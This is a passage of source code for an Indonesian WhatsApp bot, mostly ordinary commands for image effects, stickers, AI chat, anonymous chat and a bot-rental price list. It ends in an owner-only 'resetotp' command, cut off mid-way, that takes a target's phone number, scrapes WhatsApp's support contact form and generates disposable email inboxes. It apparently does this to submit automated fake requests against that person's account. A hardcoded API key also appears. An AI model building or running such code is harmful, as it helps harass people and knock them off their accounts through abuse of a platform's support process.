'katarina2', 'nauthilus', 'hecarim', 'thresh2', 'ashe2', 'xinzhao', 'tryndamere', 'syndra-2', 'sivir-2', 'lissandra2', 'karma-2', 'draven']
                if (!style.includes(m2)) {
                    getStyle(style.length, "avatar")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        avatar: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'stickerwm':
            case 'stickerwatermark':
            case 'swm':
            case 'take':
            case 'wm': {
            if (isBan) return reply(mess.ban)
                if (!isMedia) return reply(`Sᴛɪᴋᴇʀɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n⫹⫺ Cᴏɴᴛᴏʜ : ${prefix + command} ⟨ Bᴀʟᴀs Sᴛɪᴋᴇʀɴʏᴀ ⟩\n*☞ Pᴇɴɢɢᴜɴᴀᴀɴ : Tᴇxᴛ1|Tᴇxᴛ2 - TᴇsᴛGᴀɴᴢ|Gᴀɴᴛᴇɴɢ*`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
            	m.reply(mess.wait)
                if (/image/.test(mime)) {
                    let media = await tganz.downloadMediaMessage(qmsg)
                    let encmedia = await tganz.sendImageAsSticker(m.chat, media, m, { packname: m1, author: m2 })
                    await fs.unlinkSync(encmedia)
                } else if (/webp/.test(mime)) {
                    let media = await tganz.downloadMediaMessage(qmsg)
                    let encmedia = await tganz.sendImageAsSticker(m.chat, media, m, { packname: m1, author: m2 })
                    await fs.unlinkSync(encmedia)
                } else if (/sticker/.test(mime)) {
                    let media = await tganz.downloadMediaMessage(qmsg)
                    let encmedia = await tganz.sendImageAsSticker(m.chat, media, m, { packname: m1, author: m2 })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 31) return m.reply('*Mᴀᴋsɪᴍᴀʟ 30 Dᴇᴛɪᴋ*')
                    let media = await tganz.downloadMediaMessage(qmsg)
                    let encmedia = await tganz.sendVideoAsSticker(m.chat, media, m, { packname: m1, author: m2 })
                    await fs.unlinkSync(encmedia)
                } 
            }
            break
            case 'tts': {
            if (isBan) return reply(mess.ban)
         	if (!text) return reply(`Tᴇᴋs ᴍᴀɴᴀ ᴋᴀᴋ ?\n*Cᴏɴᴛᴏʜ : ${prefix + command} TᴇsᴛGᴀɴᴢ Gᴀɴᴛᴇɴɢ*`)
             let tts = await fetchJson(`https://api.akuari.my.id/texttovoice/texttosound_id?query=${text}`)
             reply(mess.wait)
             tganz.sendMessage(m.chat, { audio: { url: tts.result }, mimetype: 'audio/aac', fileName: `${text}.aac`, ptt: true }, { quoted: m })
         	}
            break
            case 'csgocover': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|negev`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|negev`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['ump45', 'tec9', 'n4a1', 'xm1014', 'famas', 'np9', 'pp-bizon', 'p2000', 'negev', 'usps', 'dualberettas', 'np5', 'karambit', 'awpdragonlore', 'np7', 'galilar', 'ak-47', 'glock', 'sg-553', 'ak47', 'r8revolver', 'aug', 'butterflyknife', 'deserteagle', 'gsg9', 'p90asiimov', 'awphawking', 'n4a4', 'sas', 'awpasiimov', 'ssg08bitw', 'sg553ds', 'r8fade', 'p90ed', 'n4a1sdecimator', 'n4a1howl', 'karambitds', 'flipknifemf', 'awmmedusa', 'augaa', 'ak47vulcan', 'ak47fs']
                if (!style.includes(m2)) {
                    getStyle(style.length, "background")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        background: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'coverloknew': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|hero\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|ilumia-5`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|hero\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|ilumia-5`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['arum-6', 'baldum-3', 'elandorr-3', 'hayate-5', 'ilumia-5', 'ishar-4', 'lauriel-8', 'nax-5', 'nurad-9', 'quillen-5', 'teemee-3', 'telannas-6', 'volkath-3', 'yena-4', 'yena-5', 'butterfly-10', 'laville', 'laville-2', 'nakroth-7', 'omen-6', 'rouie-2', 'taara-4', 'zanis-8', 'zata', 'zata-2', 'capheny-4', 'lsu-6', 'fennik-5', 'liliana-7', 'paine', 'paine-2', 'rouie', 'astrid-4', 'ata', 'ata-2', 'lauriel-8', 'omen-5', 'qi-3', 'roxie-5', 'taara-5', 'violet-12', 'wukong-7', 'wukong-8', 'hayate-4', 'ishar-4', 'jinna-5', 'kerra-2', 'lauriel-7', 'nina-5', 'quillen-5', 'richter-4', 'ryoma-6', 'telannas-8', 'tulen-9', 'yorn-8', 'aleister-4', 'dirak', 'dirak-2', 'grakk-5', 'kerra', 'raz-4', 'amily-5', 'athur-7', 'arum-5', 'ishar-2', 'nax-4', 'natalya-7', 'valhein-7', 'zill-5', 'diaochan-6', 'ignis-4', 'lubu-8', 'naloch-7', 'sephera-4', 'elandorr', 'elandorr-2', 'krizzix', 'krizzix-2', 'violet-11', 'yena-3', 'arduin-4', 'enzo-3', 'errol-3', 'hayate-3', 'krixi-7', 'nurad-7', 'volkath', 'volkath', 'volkath-2', 'wisp-4', 'wukong-6', 'celica', 'gildur-4', 'ishar', 'nurad-7', 'quillen-4', 'tulen-8', 'lauriel-6', 'qi', 'qi-2', 'darcy', 'florentino-3', 'noren-3', 'ryoma-5', 'sephera-3', 'annettte-4', 'capheny-3', 'elsu-5', 'narja-3', 'vilolet-10', 'violet-10', 'zip-2', 'zip-2a', 'airi-9', 'diaochan-5', 'enzo-2', 'lubu-7', 'nganga-4', 'payna-3', 'roxie-4', 'violet-9', 'zanis-7', 'zephys-6', 'enzo', 'liliana-6', 'lindis-5', 'xeniel-5', 'airi-9', 'errol-2', 'yena', 'yena-2', 'zuka-8', 'yorn', 'violet', 'zanis', 'thane', 'slimz', 'skud', 'preyta', 'payna', 'nakroth', 'nina', 'naloch', 'illumia', 'krixi', 'diaochan', 'butterfly', 'veera', 'valhein', 'toro', 'taara', 'raz', 'ormarr', 'nganga', 'lubu', 'kriknak', 'kahlil', 'grakk', 'gildur', 'alice', 'omega', 'wukong', 'natalya', 'nortos', 'cresht', 'airi', 'aleister', 'lumburr', 'zephis', 'violet-2', 'jinna', 'chaugnar', 'azzenka', 'valhein-2', 'zanis-2', 'skud-2', 'payna-2', 'natalya-3', 'natalya-2', 'nortos-2', 'krixi-2', 'jinna-2', 'illumia-2', 'butterfly-3', 'butterfly-2', 'yorn-2', 'taara-2', 'nakroth-2', 'lubu2', 'lauriel', 'kahlii-2', 'zuka-2', 'zuka', 'batman', 'airi-2', 'airi-3', 'butterfly-4', 'diaochan-2', 'grakk-2', 'ignis', 'ignis-2', 'lauriel2', 'nina-2', 'nurad', 'nurad-2', 'ormarr-2', 'raz-2', 'slimz2', 'violet-3', 'zill-2', 'zill', 'zanis-3', 'yorn-3', 'veera-3', 'veera-2', 'thane-2', 'telannas', 'superman', 'naloch-2', 'krixi-3', 'butterfly-5', 'violet-5', 'veera-4', 'telannas-2', 'joker', 'illumia-3', 'batman-2', 'arduin-2', 'arduin', 'zephis-2', 'wukong-2', 'ryoma-2', 'ryoma', 'nakroth-3', 'nganga-2', 'azzenka-2', 'astrid-2', 'astrid', 'arthur', 'zanis-4', 'wukong-3', 'noren', 'lubu-4', 'lauriel-3', 'lubu-3', 'chaugnar-2', 'aleister-2', 'xeniel', 'telannas-3', 'preyta-2', 'nurad-3', 'kriknak-2', 'fennik-2', 'diaochanlubu', 'alice-2', 'noren-2', 'lubu-5', 'lauriel-4', 'kilgroth', 'gildur-2', 'fennik-3', 'zephys-3', 'xeniel-2', 'xeniel-2', 'wonderwoman', 'supeman-2', 'slimz-3', 'natalya-4', 'krixi-5', 'krixi-4', 'zanis-5', 'yorn-4', 'wonderwoman-2', 'violet-4', 'prayta-3', 'naloch-3', 'airi-4', 'telannas-4', 'ormarr-4', 'ormarr-3', 'nakroth-4', 'kilgroth-2', 'kahlii-3', 'grakk-3', 'airi-5', 'natalya-5', 'fennik-4', 'valhein-4', 'teemee-2', 'teemee', 'lindis', 'zuka-3', 'tulen', 'toro-2', 'nina-3', 'naloch-4', 'lumburr-2', 'lindis-2', 'joker-2', 'grakk-4', 'gildur-3', 'aleister-3', 'tulen-2', 'toro-3', 'taara-3', 'omen-2', 'omen', 'zill-3', 'telannas-5', 'athur-2', 'zuka-4', 'nakroth-5', 'nax', 'liliana', 'raz-3', 'liliana-2', 'nax-2', 'kriknak-3', 'joker-3', 'chaugnar-3', 'wisp', 'ryoma-3', 'batman-3', 'airi-6', 'tulen-3', 'flash', 'cresht-3', 'cresht-2', 'astris-3', 'arum-2', 'arum', 'butterfly-6', 'lice-3', 'xeniel-3', 'valhein-4', 'tulen-4', 'rourke-2', 'rourke', 'nurad-4', 'nax-3', 'wisp-2', 'narja-2', 'narja', 'zuka-5', 'jinna-3', 'butterfly-7', 'arthur-2', 'violet-6', 'valhein-5', 'superman-3', 'liliana-3', 'kilgroth-3', 'diaochan-3', 'wirosabaleng-3', 'roxie-2', 'roxie', 'wukong-4', 'baldum-2', 'baldum', 'zephys-4', 'annette-2', 'annette', 'telannas-6', 'raz-4', 'nurad-6', 'nurad-5', 'jinna-4', 'amily', 'ybneth-2', 'ybneth', 'ilumia-4', 'amily-2', 'xeniel-4', 'veera-5', 'liliana-4', 'flash-2', 'arthur-3', 'omen-3', 'lindis-3', 'elsu-2', 'elsu', 'richter-2', 'richter', 'nina-4', 'thane-3', 'ryoma-4', 'quillen-2', 'quillen', 'lauriel-5', 'arum-3', 'wisp-3', 'violet-7', 'sephera-2', 'sephera', 'naloch-5', 'krixi-6', 'alice-4', 'tulen-5', 'skud-3', 'rourke-3', 'nakroth-6', 'florentino-2', 'florentino', 'elsu-3', 'butterfly-8', 'amily-3', 'zuka-7', 'zuka-6', 'yorn-6', 'yorn-5', 'veres-2', 'veres', 'naloch-6', 'cresht-4', 'azzenka-3', 'airi-7', 'zephys-5', 'yorn-7', 'violet-8', 'valhein-6', 'tulen-6', 'thane-4', 'roxie-3', 'nakroth-7', 'kahlii-4', 'elsu-4', 'darcy-2', 'darcy', 'capheny', 'zill-4', 'hayate-2', 'hayate', 'cresht-5', 'annette-3', 'amily-4', 'veera-6', 'tulen-7', 'telannas-7', 'omen-4', 'lindis-4', 'liliana-5', 'ignis-3', 'errol', 'capheny-2', 'arum-4', 'zanis-6', 'wukong-5', 'thane-5', 'slimz-4', 'skud-4', 'richter-3', 'quillen-3', 'azzenka-4', 'arduin-3', 'airi-8']
                if (!style.includes(m2)) {
                    getStyle(style.length, "hero")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        hero: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'ai': 
            case 'chatgpt':
            case 'openai': {
            if (isBan) return reply(mess.ban)
  if (!text) return reply(`Hᴀɪ ᴋᴀᴋ, Aᴘᴀ ʏᴀɴɢ ᴋᴀᴋᴀᴋ ᴍᴀᴜ ᴛᴀɴʏᴀᴋᴀɴ ᴘᴀᴅᴀ AI ?\n*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} Sɪɴɢᴋᴀᴛᴀɴ NKRI Aᴘᴀ ?*`)
  tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
      if (!quoted) throw text
   axios.get(`https://api.lolhuman.xyz/api/openai-turbo?apikey=kocheng&text=${text}&system=Aku Jawab Ya&Baik&Soal&Full&Pertanyaannya&Ramah&Open-AI&Jawab&Indonesia&Pintar&Ceria&Tampil&Cerdas&Dewasa&Hebat&Modern&Keagamaan&Dunia$Abjad&Tahun&user=user-unique-id`).then(({ data }) => {
				m.reply(`\n\n${data.result}\n\n`)
			})
}
/**const configuration = new Configuration({
apiKey: keyai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createCompletion({
model: "text-davinci-003",
prompt: q,
temperature: 0.0,
max_tokens: 2048,
top_p: 1.0,
frequency_penalty: 0.3,
presence_penalty: 0.0,
});
m.reply(`${response.data.choices[0].text}\n\n`);
}**/
break
	    case 'anonymous':
	    case 'anonimous':
	    case 'anonim': {
	    if (isBan) return reply(mess.ban)
    if (!isPrivate) return reply(mess.pc)
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
                    { buttonId: '.start', buttonText: { displayText: 'Start' }, type: 1 }
                ]
                tganz.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await tganz.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, footer_text, m)
            }
         			break
            case 'keluar': case 'leave': case 'stop': {
            if (isBan) return reply(mess.ban)
            if (!isPrivate) return reply(mess.pc)
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: '.start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await tganz.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                m.reply('_Oᴋᴇ, Kᴀᴍᴜ sᴜᴅᴀʜ ᴋᴇʟᴜᴀʀ ᴅᴀʀɪ sᴇsɪ ᴄʜᴀᴛ ᴀɴᴏɴʏᴍᴏᴜs !!!_')
                let other = room.other(m.sender)
                if (other) await tganz.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
             break
            case 'mulai': case 'start': {
            if (isBan) return reply(mess.ban)
            if (!isPrivate) return reply(mess.pc)
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: '.keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await tganz.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, footer_text, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: '.next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: '.keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await tganz.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, footer_text, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await tganz.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, footer_text, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: '.keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await tganz.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, footer_text, m)
                } 
              }
                break
            case 'next': case 'lanjut': {
            if (isBan) return reply(mess.ban)
            if (!isPrivate) return reply(mess.pc)
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: '.start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await tganz.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await tganz.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: '.next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: '.keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await tganz.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, footer_text, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await tganz.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, footer_text, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: '.keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await tganz.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, footer_text, m)
                }
              }
                break
            case 'aiimg': 
            case 'ai-img': 
            case 'aiimage': 
            case 'aimage': 
            case 'aimg': 
            case 'aidraw': 
            case 'aidraws': 
            case 'openaiimg': 
            case 'aigambar': {
            if (isBan) return reply(mess.ban)
 if (!text) return reply(`Hᴀɪ ᴋᴀᴋ, Aᴘᴀ ɢᴀᴍʙᴀʀ ʏᴀɴɢ ᴍᴀᴜ ᴅɪʙᴜᴀᴛᴋᴀɴ ᴏʟᴇʜ Oᴘᴇɴ - AI ?\n*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} Rᴜᴍᴀʜ*`)
 reply(mess.wait)
 tganz.sendMessage(m.chat, { image: { url : `https://api.lolhuman.xyz/api/dall-e?apikey=${lolkeysapi}&text=${text}` }, caption: `🤖 *Hᴀsɪʟ Gᴀᴍʙᴀʀ* : ⟨ ${text} ⟩`}, { quoted: m } )
/**const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createImage({
prompt: text,
n: 5,
size: "512x512",
});
//console.log(response.data.data[0].url)
tganz.sendImage(from, response.data.data[0].url, text, m)**/
}
break
           case 'buysewa':
           case 'sudahbang':
           case 'buysewarelog': {
                tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
                tganz.sendMessage(m.chat, { image: fs.readFileSync('./image/foto.jpg'), caption: `⫹⫺ _*Sɪʟᴀʜᴋᴀɴ ᴛᴜɴɢɢᴜ ʀᴇsᴘᴏɴ ᴏᴡɴᴇʀᴋᴜ !!!*_`}, { quoted: m })
                }
                break
           case 'buyprem':
           case 'sewabot':
           case 'buypremium':
           case 'order':
           case 'sewa': {
                tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
                tganz.sendMessage(m.chat, { image: fs.readFileSync('./image/foto.jpg'), caption: `⫹⫺ Hᴀɪ ᴋᴀᴋ *${m.pushName}* 😍
⫹⫺ Sᴇʟᴀᴍᴀᴛ *${salam.slice(0,1).toUpperCase() + salam.slice(1)}* ᴋᴀᴋ 🙌🏻

❑ Lɪsᴛ Hᴀʀɢᴀ Sᴇᴡᴀ :
╔═══════════════════❑
╠☞ 5ᴋ - 1 Hᴀʀɪ/Dᴀʏ ⟨ *Bɪᴀsᴀ* ⟩
╠☞ 10ᴋ - 3 Hᴀʀɪ/Dᴀʏ ⟨ *Kʟᴀsɪᴋ* ⟩
╠☞ 20ᴋ - 7 Hᴀʀɪ/Dᴀʏ ⟨ *Eʟɪᴛᴇ* ⟩
╠☞ 35ᴋ - 14 Hᴀʀɪ/Dᴀʏ ⟨ *Pʟᴀᴛɪɴᴜᴍ* ⟩
╠☞ 50ᴋ - 20 Hᴀʀɪ/Dᴀʏ ⟨ *Mᴇᴍʙᴇʀ* ⟩
╠☞ 80ᴋ - 1 Bᴜʟᴀɴ ⟨ *Gʀᴀɴᴅ Mᴀsᴛᴇʀ* ⟩
╚═══════════════════❑

❑ *Bᴀᴄᴀ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ sᴇʙᴇʟᴜᴍ ᴍᴇɴʏᴇᴛᴜᴊᴜɪ ᴘᴇᴍʙᴇʟɪᴀɴ !!!*
╚⊙ _Iɴɪ ᴀᴅᴀʟᴀʜ ᴄᴀʀᴀ ᴋᴇʀᴊᴀ ᴘᴇᴍʙᴇʀɪᴀɴ ᴀᴋsᴇs ᴘʀᴇᴍ/sᴇᴡᴀ ᴛᴇʀʜᴀᴅᴀᴘ ᴘᴇᴍʙᴇʟɪɴʏᴀ !_
╔═════════════════════❑
╠❑ ᴘᴇᴍʙᴇʟɪᴀɴ ɪɴɪ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ʏᴀɴɢ ɴɪᴀᴛ !
╠❑ ᴀᴋsᴇs ᴘʀᴇᴍ/sᴇᴡᴀ sᴇsᴜᴀɪ ᴍᴀsᴀ ᴡᴀᴋᴛᴜ ʏᴀɴɢ ᴜᴅᴀʜ ᴅɪ
║ᴛᴇɴᴛᴜᴋᴀɴ !
╠❑ ᴘᴇᴍʙᴇʟɪᴀɴ ɪɴɪ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴅɪ ʀᴇᴛᴜʀ/ʙᴀʟɪᴋᴀɴ !
╠❑ ᴀᴋsᴇs ɪɴɪ ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀɪᴛᴀɴɴʏᴀ ᴅᴇɴɢᴀɴ ᴊᴏɪɴ ʙᴏᴛ ᴋᴇ
║ᴅᴀʟᴀᴍ ɢʀᴜᴘ sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴀᴋsᴇs ɪɴɪ ʙᴇʀʟᴀᴋᴜ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ
║ғɪᴛᴜʀ ʏᴀɴɢ ᴛᴇʀᴋᴜɴᴄɪ ᴋᴀʀᴇɴᴀ ʙᴀᴛᴀs ʟɪᴍɪᴛ/ᴘʀᴇᴍɪᴜᴍ !
╠❑ ᴊɪᴋᴀ ᴛᴇʀᴊᴀᴅɪ ᴇʀʀᴏʀ ᴅɪ ʟᴜᴀʀ ᴅᴜɢᴀᴀɴ ᴊᴀɴɢᴀɴ ᴘᴀɴɪᴋ
║ɴᴀɴᴛɪ ᴀᴋᴀɴ ᴏᴡɴᴇʀ ᴘᴇʀʙᴀɪᴋɪ ᴏᴛᴏᴍᴀᴛɪs !
╠❑ ᴛɪᴅᴀᴋ ᴍᴇᴍᴀᴋsᴀ ᴅᴀʟᴀᴍ ʜᴀʟ ᴊᴏɪɴ ɢʀᴜᴘ, ɪɴɢᴀᴛ ᴀᴋsᴇs ɪɴɪ 
║ʙᴇʀʟᴀᴋᴜ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ғɪᴛᴜʀ ʏᴀɴɢ ᴛᴇʀᴋᴜɴᴄɪ sᴇᴘᴇʀᴛɪ
║ғɪᴛᴜʀ ʙᴀᴛᴀs ʟɪᴍɪᴛ/ᴘʀᴇᴍɪᴜᴍ !
╠❑ ᴊɪᴋᴀ ᴍᴇɴᴇᴍᴜᴋᴀɴ ʙᴜɢ/ʜᴀʟ ʏᴀɴɢ ᴍᴇɴᴜʀᴜᴛ ᴍᴜ ʙᴏᴛ ʀᴜsᴀᴋ
║ᴄʜᴀᴛ ᴏᴡɴᴇʀ sᴀᴊᴀ ᴋᴇᴛɪᴋ : *#ᴏᴡɴᴇʀ* !
╠═════════════════════❑
║*ᴘᴇᴍʙᴇʀɪᴛᴀʜᴜᴀɴ ᴛᴇʀsᴇʙᴜᴛ ᴀᴅᴀʟᴀʜ ᴋᴇᴛᴇɴᴛᴜᴀɴ ʏᴀɴɢ sᴀʏᴀ*
║*ʙᴜᴀᴛ sᴇɴᴅɪʀɪ ᴀɢᴀʀ ᴘᴇᴍʙᴇʟɪ ᴛɪᴅᴀᴋ sᴀʟᴀʜ ᴘᴀʜᴀᴍ ᴅᴀʟᴀᴍ*
║*ᴘᴇɴɢᴀᴊᴜᴀɴ ʙᴀʟɪᴋ ᴜᴀɴɢ ᴍᴀᴜᴘᴜɴ ʜᴀʟ ʟᴀɪɴɴʏᴀ !!!*
╚═════════════════════❑

❑ Iɴғᴏ ᴘᴇᴍʙᴀʏᴀʀᴀɴ :
╔═══════════════❑
╠⌘ *Dᴀɴᴀ* : ⟨ 089512696170 ⟩
╠⌘ *Oᴠᴏ* : ⟨ 089512696170 ⟩
╠⌘ *Gᴏᴘᴀʏ* : ⟨ 089512696170 ⟩
╚═══════════════❑

⩠ _ᴊɪᴋᴀ ᴋᴀᴍᴜ ɴɪᴀᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴇʟɪ ᴀᴋsᴇs ɪɴɪ sɪʟᴀʜᴋᴀɴ ᴋᴇᴛɪᴋ : #ʙᴜʏsᴇᴡᴀ, ᴛᴜɴɢɢᴜ ᴏᴡɴᴇʀ ᴏɴʟɪɴᴇ ᴅᴀɴ ᴍᴇᴍʙᴀʟᴀs ᴘᴇᴍʙᴇʟɪᴀɴ ᴍᴜ !!!_` }, { quoted: m })
            }
            break
            case 'motivasi':
            case 'dilanquote':
            case 'katasenja':
            case 'randomquote':
            case 'muslimquote':
            case 'kanyequote':
            case 'animequotes2':
            case 'trumpquote':
            case 'trumpthink':
            case 'creepyfact':
            case 'faktaunik':
            case 'puisi':
            case 'pantun': {
            if (isBan) return reply(mess.ban)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://api.zahwazein.xyz/randomtext/${command}?apikey=${zenzkeyss}`)
              replay(`\n${anu.result.message}\n`)
            }
            break
            case 'galauquote':
            case 'sad':
            case 'galau': {
            if (isBan) return reply(mess.ban)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://api.zahwazein.xyz/randomtext/galauquote?apikey=${zenzkeyss}`)
              replay(`\n${anu.result.message}\n`)
            }
            break
            case 'bucin': {
            if (isBan) return reply(mess.ban)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://api.zahwazein.xyz/randomtext/bucinquote?apikey=${zenzkeyss}`)
              replay(`\n${anu.result.message}\n`)
            }
            break
case 'resetwa':
case 'resetotp':{
  if (isBan) return reply(mess.ban)
  if (!isCreator) return reply(mess.owner)
if (!q) return m.reply(`@Tᴀɢ/Nᴏᴍᴏʀɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*⫹⫺ Cᴏɴᴛᴏʜ : ${prefix + command} @Tᴀɢ/62xxxx*`)
if (m.quoted || q) {
const froms = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')
var cekno = await tganz.onWhatsApp(froms)
if (cekno.length == 0) return m.reply(`@Tᴀɢ/Nᴏᴍᴏʀɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*⫹⫺ Cᴏɴᴛᴏʜ : ${prefix + command} @Tᴀɢ/62xxxx*`)
if (froms === ownerNumber) return m.reply(`*Tɪᴅᴀᴋ ʙɪsᴀ ʀᴇsᴇᴛ-ᴏᴛᴘ ᴏᴡɴᴇʀ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴏᴡɴᴇʀ ʏᴀɴɢ ᴛᴇʟᴀʜ ᴍᴇɴᴄɪᴘᴛᴀᴋᴀɴ ʙᴏᴛ ɪɴɪ !!!*`)
var targetnya = froms.split('@')[0]
await tganz.sendMessage(m.chat, { react: { text: `📮`, key: m.key }})
try {
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
var $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
